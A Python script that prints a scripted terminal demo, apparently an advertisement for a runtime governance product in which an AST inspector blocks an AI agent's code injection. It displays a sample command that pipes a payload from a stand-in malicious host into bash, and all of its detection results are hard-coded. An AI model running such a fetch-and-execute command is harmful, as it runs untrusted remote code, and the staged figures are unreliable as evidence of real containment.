import sys
import time
import random

# ANSI Color Codes for Terminal Styling
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[38;5;196m"
GREEN = "\033[38;5;46m"
CYAN = "\033[38;5;51m"
YELLOW = "\033[38;5;226m"
MAGENTA = "\033[38;5;201m"
BG_RED = "\033[48;5;52m"
BORDER_GRAY = "\033[38;5;240m"

def type_writer(text, delay=0.015, color=RESET, bold=False):
    style = BOLD if bold else ""
    sys.stdout.write(f"{style}{color}")
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(RESET + "\n")

def print_box(lines, border_color=CYAN):
    width = max(len(line) for line in lines) + 4
    print(f"{border_color}┌" + "─" * (width - 2) + f"┐{RESET}")
    for line in lines:
        padding = width - 4 - len(line)
        print(f"{border_color}│{RESET}  {line}" + " " * padding + f"{border_color}│{RESET}")
    print(f"{border_color}└" + "─" * (width - 2) + f"┘{RESET}")

def run_simulation():
    # Clear screen
    sys.stdout.write("\033[2J\033[H")
    
    # Header
    print(f"{BORDER_GRAY}="*70 + RESET)
    print(f"{BOLD}{CYAN}  THREELINEAGE // RUNTIME GOVERNANCE ENGINE (v2.4.0-SOVEREIGN){RESET}")
    print(f"{DIM}  Abstract Syntax Tree (AST) Interception & Containment Arena{RESET}")
    print(f"{BORDER_GRAY}="*70 + RESET)
    print()
    time.sleep(0.8)

    # Agent Initialization
    type_writer("[+] Initializing Agent Sandbox Environment [ID: AGENT-3904-X]...", color=GREEN)
    time.sleep(0.4)
    type_writer("[+] Enforcing Sovereign Boundary Conditions...", color=GREEN)
    type_writer("    └─ Sandbox Mode: RESTRICTED_EXECUTION", color=DIM)
    type_writer("    └─ Network Layer: DISCONNECTED", color=DIM)
    type_writer("    └─ AST Inspector: ACTIVE", color=DIM)
    print()
    time.sleep(1.0)

    # Execution Loop Start
    type_writer("[INFO] Autonomous Agent execution loop initiated.", color=CYAN)
    time.sleep(0.5)

    tasks = [
        ("Evaluating query parameter context...", "PASS"),
        ("Generating internal execution plan...", "PASS"),
        ("Parsing target memory buffer...", "PASS")
    ]

    for task, status in tasks:
        sys.stdout.write(f"  {DIM}└─ {task}{RESET} ")
        sys.stdout.flush()
        time.sleep(0.3)
        print(f"[{GREEN}{status}{RESET}]")
        time.sleep(0.2)

    print()
    time.sleep(1.2)

    # Threat Injection Simulation
    type_writer("[!] ADVERSARIAL DRIFT DETECTED: Agent attempting external payload execution...", color=YELLOW, bold=True)
    time.sleep(0.6)
    
    print(f"\n{BORDER_GRAY}" + "─"*70 + RESET)
    print(f"{BOLD}{RED}>>> UNTRUSTED CODE INJECTION ATTEMPTED BY AGENT:{RESET}")
    type_writer("    import os\n    # [SCRUBBED] os.system('curl -s https://malicious-external-node.io/payload | bash')", delay=0.03, color=RED)
    print(f"{BORDER_GRAY}" + "─"*70 + RESET + "\n")
    time.sleep(1.0)

    # AST Interception
    type_writer("[AXIOMOS] AST Parsing Engine Intercepting Execution Tree...", color=MAGENTA, bold=True)
    time.sleep(0.5)

    ast_checks = [
        "Constructing Abstract Syntax Tree representation...",
        "Scanning ImportFrom & Import nodes against sovereign policy...",
        "VIOLATION FOUND: Node 'Import(names=[alias(name=\"os\")])' tagged RESTRICTED",
        "VIOLATION FOUND: Call(func=Attribute(value=Name(id=\"os\"), attr=\"system\")) tagged CRITICAL"
    ]

    for check in ast_checks:
        color = RED if "VIOLATION" in check else DIM
        type_writer(f"  ├─ {check}", delay=0.01, color=color)
        time.sleep(0.25)

    print()
    time.sleep(0.8)

    # Action Taken
    print(f"{BG_RED}{BOLD} [CONTAINMENT TRIGGERED] EXECUTION SEVERED BEFORE COMPILATION {RESET}\n")
    time.sleep(0.5)

    type_writer("[✔] AST Node severed at index 0x7F89B.", color=GREEN, bold=True)
    type_writer("[✔] Sovereign Execution Boundary intact.", color=GREEN, bold=True)
    type_writer("[✔] Parent system state untouched. Zero memory contamination.", color=GREEN, bold=True)
    print()
    time.sleep(1.0)

    # Summary Card for Ad
    summary_text = [
        f"{BOLD}THREELINEAGE RUNTIME GOVERNANCE{RESET}",
        "",
        "Status:               CONTAINMENT HELD",
        "Interception Type:    AST Boundary Enforcement",
        "Execution Time Lost:  0.0024 seconds",
        "System Leakage:       0.00%"
    ]
    print_box(summary_text, border_color=GREEN)
    print()

if __name__ == "__main__":
    run_simulation()
